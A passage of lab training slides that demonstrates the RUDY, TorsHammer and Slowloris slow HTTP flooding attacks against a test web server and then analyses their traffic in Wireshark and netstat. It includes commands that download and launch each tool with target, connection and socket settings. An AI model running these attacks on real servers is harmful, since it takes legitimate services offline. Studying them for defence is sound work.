- Check the status of your proxy by navigating to the path shown as below. If it is not set up,
press the 'Add' button to set it up.
We will explore the RUDY attack method and how to analyze it.
RUDY attack
# burpsuite &

## Page 142

142142
HTTP flooding
⚫ Attack method
- Proxy settings
• In the "Intercept" tab, click the “Intercept is on" button to toggle it to the off state and
perform the page move.
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 143

143143
HTTP flooding
⚫ Attack method
- Search for attack pages
• Start the Firefox browser.
• Go to the Ubuntu page.
• Check the "Likes" button on the main
page.
• Change the Burpsuite intercept status
to on.
• Click the "Likes" button.
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 144

144144
HTTP flooding
⚫ Attack method
- Search for attack pages
• Back in Burpsuite, check the HTTP POST method, and copy the URL '/wp-content/ ~
ajax_counter.php’.
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 145

145145
HTTP flooding
⚫ Attack method
- RUDY attacks
• Navigate to the folder where you unzipped RUDY.
• Paste the copied address via the vi editor (paste : mouse wheel click or Shift + Insert).
We will explore the RUDY attack method and how to analyze it.
RUDY attack
#vi rudeadyet.conf
[parameters]
URL: http://192.168.0.140/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php
number_of_connections: 500
attack_parameter: post_id
proxy_addr: ""
proxy_port: 0
# python r-u-dead-yet-v2.2.py # execute attack

## Page 146

146146
HTTP flooding
⚫ Attack method
- Attempt to connect to the server using a web browser on the host PC
- Check the status of the server that is unreachable.
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 147

147147
HTTP flooding
⚫ Attack analysis
- Run Wireshark on the host PC
- Click the icon >> select VMnet8 >> click the “Start” button.
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 148

148148
HTTP flooding
⚫ Attack analysis
- Identify HTTP connection requests to port 80 consistently from multiple ports with the RUDY
characteristics.
- Randomly select the SYN, SYN+ACK, and ACK packets of the 3-way handshake process, and
then right-click on → select “Follow → TCP Stream".
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 149

149149
HTTP flooding
⚫ Attack analysis
- It uses the slow-rate method, so there is a large time gap (in 10-second increments) between
packets sent in the same session.
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 150

150150
HTTP flooding
⚫ Attack analysis
- Results are available at the “Follow TCP Stream” dialog box.
- Look for a response packet with the following information.
• Content-Length: 10000
• Notice how the body part "post_id=AAA" is gradually populated with data from the POST
method.
We will explore the RUDY attack method and how to analyze it.
RUDY attack

## Page 151

151151
HTTP flooding
⚫ Lab environments
- Attacker : Kali Linux
- Victim : CentOS 6.9
• Enable HTTP services
• IP : 192.168.0.171
We will explore the TorsHammer attack method and how to analyze it.
TorsHammer attack

## Page 152

152152
HTTP flooding
⚫ Attack method
- Run on Kali
- Download the attack tool from Sourceforge and run it as follows
We will explore the TorsHammer attack method and how to analyze it.
TorsHammer attack
# wget https://sourceforge.net/projects/torshammer/files/latest/download?source=files -O torshammer.zip
# unzip torshamer.zip # Decompress
# cd Torshammer\ 1.0/

## Page 153

153153
HTTP flooding
⚫ Attack method
- Perform an attack using Python in a related directory
We will explore the TorsHammer attack method and how to analyze it.
TorsHammer attack
# python torshammer.py -t 192.168.0.171 -p 80 -r 256
:
/*
 * Target: 192.168.0.171 Port: 80
 * Threads: 256 Tor: False
 * Give 20 seconds without tor or 40 with before checking site
Posting: u
Posting: w
:
-p [portnumber] : port number
-r [threadcount]: number of working threads

## Page 154

154154
HTTP flooding
⚫ Attack Methods
- Check for server access attempts through a web browser
- Check the status of the server that is unreachable
We will explore the TorsHammer attack method and how to analyze it.
TorsHammer attack

## Page 155

155155
HTTP flooding
⚫ Attack analysis
- Check the session connection status of the victim server
We will explore the TorsHammer attack method and how to analyze it.
TorsHammer attack
$ netstat -nat
:
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51214  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51436  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51326  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51260  ESTABLISHED
tcp      187      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51632  ESTABLISHED
tcp      187      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51672  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51106  ESTABLISHED
tcp      150      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51654  ESTABLISHED
tcp      189      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51442  ESTABLISHED
tcp      144      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51578  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:50988  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51108  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51372  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51112  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51152  ESTABLISHED
tcp      175      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51458  ESTABLISHED
:

## Page 156

156156
HTTP flooding
⚫ Attack analysis
- Run Wireshark on the host PC
- Click the icon >> Select VMnet8 >> Click the “Start” button.
We will explore the TorsHammer attack method and how to analyze it.
TorsHammer attack

## Page 157

157157
HTTP flooding
⚫ Attack analysis
- You can see that the POST method processes the number of Seqs in increments of 1.
• An increase in Seq means that packet data is being sent and processed in 1 byte sizes.
• Each source port is different and continuously sends small packets to maintain the session.
• This makes it difficult to handle legitimate session connection requests as they come in.
We will explore the TorsHammer attack method and how to analyze it.
TorsHammer attack

## Page 158

158158
HTTP flooding
⚫ Attack analysis
- You can see that the POST method processes the number of Seqs in increments of 1.
• An increase in Seq means that packet data is being sent and processed in 1 byte sizes.
• Each source port is different and continuously sends small packets to maintain the session.
• This makes it difficult to handle legitimate session connection requests as they come in.
We will explore the TorsHammer attack method and how to analyze it.
TorsHammer attack

## Page 159

159159
HTTP flooding
⚫ Lab environments
- Attacker : Kali Linux
• IP : 192.168.0.170
- Victim : CentOS 6.9
• Enable HTTP services
• IP : 192.168.0.171
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack

## Page 160

160160
HTTP flooding
⚫ Attack method
- Run on Kali
- Download the attack tool from github and run it as follows
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack
# git clone https://github.com/gkbrk/slowloris.git
# cd slowloris
# python3 slowloris.py 192.168.0.171 -p 80 -s 10000
[07-02-2018 17:48:56] Attacking 192.168.0.171 with 10000 sockets.
[07-02-2018 17:48:56] Creating sockets...
-p [portnumber] : port number
-s [sockets]: number of sockets

## Page 161

161161
HTTP flooding
⚫ Attack method
- Check for server access attempts through a web browser
- Check server unreachability status
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack

## Page 162

162162
HTTP flooding
⚫ Attack analysis
- Check the session connection status of the victim server
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack
$ netstat -nat
:
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51214  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51436  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51326  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51260  ESTABLISHED
tcp      187      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51632  ESTABLISHED
tcp      187      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51672  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51106  ESTABLISHED
tcp      150      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51654  ESTABLISHED
tcp      189      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51442  ESTABLISHED
tcp      144      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51578  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:50988  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51108  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51372  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51112  ESTABLISHED
tcp        0      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51152  ESTABLISHED
tcp      175      0 ::ffff:192.168.0.171:80     ::ffff:192.168.0.210:51458  ESTABLISHED
:

## Page 163

163163
HTTP flooding
⚫ Attack analysis
- Run Wireshark on the host PC
- Click the icon >> Select VMnet8 >> Click the “Start” button.
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack

## Page 164

164164
HTTP flooding
⚫ Attack analysis
- After a 3-way handshake connection is made, move the header of the GET method to see
how other connections are repeated.
- The data in the GET header is arbitrary and can take different forms
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack

## Page 165

165165
HTTP flooding
⚫ Attack analysis
- Select a GET header and examine the packet data
- Abnormal packets are dropped in the form of 0d0a.
- Normal packets end in the form of 0d0a0d0a, but they end in 0d0a and wait for the next
packet to arrive.
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack

## Page 166

166166
HTTP flooding
⚫ Attack analysis
- For normal packets, you can see the below screen.
- Check the header of a GET after the 3-way handshake has taken place
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack

## Page 167

167167
HTTP flooding
⚫ Attack analysis
- Examine the last 0d0a0d0a data after selecting the GET header packet
- Last data can be analyzed against packets for normal behavior to verify.
We will explore the Slowloris attack method and how to analyze it.
Slowloris attack
